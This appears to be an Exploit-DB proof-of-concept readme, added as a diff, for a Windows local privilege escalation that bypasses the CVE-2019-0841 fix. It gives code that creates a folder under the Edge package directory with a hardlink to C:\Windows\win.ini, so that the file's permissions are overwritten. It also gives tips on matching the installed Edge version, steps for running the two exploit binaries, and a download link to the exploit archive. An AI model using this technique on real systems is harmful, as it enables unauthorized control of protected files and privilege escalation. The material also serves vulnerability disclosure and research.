@@ -1,0 +1,28 @@
+There is still a vuln in the code triggered by CVE-2019-0841
+
+The bug that this guy found: https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/
+
+If you create the following:
+
+(GetFavDirectory() gets the local appdata folder, fyi)
+
+CreateDirectory(GetFavDirectory() + L"\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Microsoft.MicrosoftEdge_44.17763.1.0_neutral__8wekyb3d8bbwe",NULL);
+CreateNativeHardlink(GetFavDirectory() + L"\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Microsoft.MicrosoftEdge_44.17763.1.0_neutral__8wekyb3d8bbwe\\bear3.txt", L"C:\\Windows\\win.ini");
+
+If we create that directory and put an hardlink in it, it will write the DACL.
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!IMPORTANT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Microsoft.MicrosoftEdge_44.17763.1.0_neutral__8wekyb3d8bbwe this part (i.e 44.17763.1.0) has to reflect the currently installed edge version, you will need to mofidy this in the PoC (polarbear.exe) if different.
+You can find this by opening edge -> settings and scrolling down.
+Best thing is to just create a folder and hardlink for all the recent edge versions when writing an exploit. But I guess you can also probably get the installed version programmatically.
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!IMPORTANT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+To repro:
+
+1. Run polarbear.exe
+2. Run windowsappslpe.exe (doesn't matter what file you pass in commandline.. will just make win.ini write-able.. rewrite the original PoC yourself)
+
+Use the vide demo as guidance..
+
+EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46938.zip
